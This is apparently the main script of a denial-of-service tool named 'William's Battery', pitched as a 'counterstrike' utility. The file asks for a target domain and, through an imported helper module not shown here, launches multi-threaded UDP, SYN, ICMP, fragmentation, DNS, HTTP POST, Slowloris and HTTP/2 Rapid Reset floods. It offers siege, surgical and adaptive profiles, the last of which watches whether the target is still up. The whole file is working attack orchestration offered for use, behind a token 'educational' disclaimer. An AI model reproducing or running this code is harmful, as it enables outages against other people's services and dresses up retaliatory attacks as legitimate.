# main.py (Updated to integrate H2 Rapid Reset into blended profiles)

import threading
import time
import socket
import counter_strike_helper


def launch_attack_thread(target_func, args_tuple):
    """Helper to create, start, and return a daemon thread."""
    thread = threading.Thread(target=target_func, args=args_tuple)
    thread.daemon = True
    thread.start()
    return thread


def full_scale_counter_strike(target):
    """
    Launches a MASSIVE, PROLONGED, blended, multi-threaded counter-attack.
    This is a siege designed to run for a long time.
    """
    print("=" * 60 + "\nMODE: FULL SCALE COUNTER-STRIKE (SIEGE)\n" + "=" * 60)
    stop_event, pause_event = threading.Event(), threading.Event()
    attack_threads = []

    # --- Parameters for a long-running, high-intensity siege ---
    params = {
        "threads": 250,
        "slowloris_sockets": 200,
        "h2_threads": 50,
        "duration": 360,
    }
    print(
        f"[CONFIG] Siege mode: Using {params['threads']} flood threads, {params['slowloris_sockets']} Slowloris sockets, and {params['h2_threads']} H2 connections.")

    # --- Launch Network Layer Floods (L3/L4) ---
    print("[+] Preparing L3/L4 vectors (UDP, SYN, ICMP, TCP Frag)...")
    for port in [53, 123]:  # UDP
        args = ("UDP-Mix", target, port, params["duration"], stop_event, pause_event, params["threads"])
        attack_threads.append(launch_attack_thread(counter_strike_helper.attack_udp, args))
    for port in [80, 443, 22, 3389, 25]:  # SYN
        args = (target, port, params["duration"], stop_event, pause_event, params["threads"])
        attack_threads.append(launch_attack_thread(counter_strike_helper.synflood, args))
    args = (target, params["duration"], stop_event, pause_event, params["threads"])  # ICMP
    attack_threads.append(launch_attack_thread(counter_strike_helper.icmpflood, args))
    # NEW: TCP Fragmentation Attack on common web ports
    for port in [80, 443]:
        args = (target, port, params["duration"], stop_event, pause_event, params["threads"])
        attack_threads.append(launch_attack_thread(counter_strike_helper.attack_tcp_fragmentation, args))

    # --- Launch Application Layer Floods (L7) ---
    print("[+] Preparing L7 vectors (DNS Query, POST Flood, Slowloris, H2 Reset)...")
    args = (target, params["duration"], stop_event, pause_event, params["threads"])  # DNS Query
    attack_threads.append(launch_attack_thread(counter_strike_helper.attack_dns_query_flood, args))
    for port in [80, 443, 8080]:  # HTTP POST
        args = (target, port, params["duration"], stop_event, pause_event, params["threads"])
        attack_threads.append(launch_attack_thread(counter_strike_helper.attack_http_post, args))
    for port in [80, 443]:  # Slowloris
        args = (target, port, params["duration"], stop_event, pause_event, params["slowloris_sockets"])
        attack_threads.append(launch_attack_thread(counter_strike_helper.attack_slowloris, args))
    for port in [443, 8443]:  # H2 Reset
        args = (target, port, params["duration"], stop_event, pause_event, params["h2_threads"])
        attack_threads.append(launch_attack_thread(counter_strike_helper.attack_h2_rapid_reset, args))

    print(f"[+] Full-scale attack launched. Press Ctrl+C to stop.")
    try:
        while any(t.is_alive() for t in attack_threads): time.sleep(1)
    except KeyboardInterrupt:
        print("\n[!] Keyboard interrupt received. Signaling all threads to stop...")
        stop_event.set()


def fast_scale_counter_strike(target):
    """
    Launches a FAST, INTENSE, blended, multi-threaded counter-attack.
    Includes the more effective HTTP POST and H2 Rapid Reset floods.
    """
    print("=" * 60 + "\nMODE: FAST COUNTER-STRIKE (SURGICAL STRIKE)\n" + "=" * 60)
    stop_event, pause_event = threading.Event(), threading.Event()
    attack_threads = []

    params = {
        "threads": 100,  # Moderate thread count
        "h2_threads": 25,  # Fewer H2 threads
        "duration": 60,
    }
    print(f"[CONFIG] Surgical mode: Using {params['threads']} flood threads and {params['h2_threads']} H2 connections.")

    # Launch focused attacks
    args = (target, params["duration"], stop_event, pause_event, params["threads"])  # DNS Query
    attack_threads.append(launch_attack_thread(counter_strike_helper.attack_dns_query_flood, args))
    for port in [80, 443, 22]:  # SYN
        attack_threads.append(launch_attack_thread(counter_strike_helper.synflood, (
        target, port, params["duration"], stop_event, pause_event, params["threads"])))
    for port in [80, 443]:  # HTTP POST
        attack_threads.append(launch_attack_thread(counter_strike_helper.attack_http_post, (
        target, port, params["duration"], stop_event, pause_event, params["threads"])))
    # NEW: HTTP/2 Rapid Reset
    attack_threads.append(launch_attack_thread(counter_strike_helper.attack_h2_rapid_reset, (
    target, 443, params["duration"], stop_event, pause_event, params["h2_threads"])))

    print(f"[+] Fast-scale attack launched. Running for {params['duration']}s. Press Ctrl+C to stop.")
    try:
        time.sleep(params["duration"])
    except KeyboardInterrupt:
        print("\n[!] Keyboard interrupt received.")
    finally:
        print("\n[!] Timespan elapsed or interrupted. Signaling all threads to stop...")
        stop_event.set()


def adaptive_strike(target):
    """Launches a 'Fast Scale' profile managed by an adaptive controller."""
    print("=" * 60 + "\nMODE: ADAPTIVE COUNTER-STRIKE (SMART STRIKE)\n" + "=" * 60)
    try:
        check_port = int(input("Enter the port to monitor for target status (e.g., 443): "))
        check_interval = int(input("Enter the status check interval in seconds (e.g., 15): "))
        total_duration = int(input("Enter the total attack duration in seconds (e.g., 600): "))
        threads = int(input("Enter number of threads for classic floods (e.g., 150): "))
        h2_threads = int(input("Enter number of H2 connections (e.g., 40): "))
        target_ip = socket.gethostbyname(target)
    except (ValueError, socket.gaierror) as e:
        print(f"[!] Invalid input or could not resolve host: {e}. Aborting.")
        return

    stop_event, pause_event = threading.Event(), threading.Event()

    # Define the attack profile, now including H2 Rapid Reset
    attack_profile = [
        (counter_strike_helper.attack_dns_query_flood, (target, total_duration, stop_event, pause_event, threads)),
        (counter_strike_helper.synflood, (target, 80, total_duration, stop_event, pause_event, threads)),
        (counter_strike_helper.attack_http_post, (target, 80, total_duration, stop_event, pause_event, threads)),
        # NEW: HTTP/2 Rapid Reset
        (counter_strike_helper.attack_h2_rapid_reset,
         (target, 443, total_duration, stop_event, pause_event, h2_threads)),
    ]

    for func, args in attack_profile:
        launch_attack_thread(func, args)

    controller_args = (target_ip, check_port, stop_event, pause_event, check_interval)
    launch_attack_thread(counter_strike_helper.adaptive_attack_controller, controller_args)

    print(f"[+] Adaptive attack launched. Total duration: {total_duration}s. Press Ctrl+C to stop.")
    try:
        time.sleep(total_duration)
    except KeyboardInterrupt:
        print("\n[!] Keyboard interrupt received.")
    finally:
        print("\n[!] Timespan elapsed or interrupted. Signaling all threads to stop...")
        stop_event.set()
        time.sleep(2)


# --- Main Execution Block with Updated Descriptions ---
if __name__ == "__main__":
    print("-" * 60 + "\nWELCOME TO WILLIAM'S BATTERY ---- A CONVENIENT COUNTERSTRIKE TOOL\n" + "-" * 60)
    print("This tool is for educational purposes ONLY. Use responsibly and legally.")
    target_domain = str(input("Please Enter The Domain Name Of Your Target: "))

    try:
        options_text = """
Select an Attack Profile:
  1: Full Scale Counterstrike (Max-power siege with all L3-L7 vectors including Fragmentation)
  2: Fast Counterstrike (Short, intense burst with modern L7 vectors)
  3: Adaptive Counterstrike (Smart, responsive attack with modern L7 vectors)

Please enter your option: """
        options = int(input(options_text))

        if options == 1:
            full_scale_counter_strike(target_domain)
        elif options == 2:
            fast_scale_counter_strike(target_domain)
        elif options == 3:
            adaptive_strike(target_domain)
        else:
            print("Invalid option selected. Exiting.")

    except ValueError:
        print("Invalid input. Please enter a number.")
    except Exception as e:
        print(f"An unexpected error occurred: {e}")
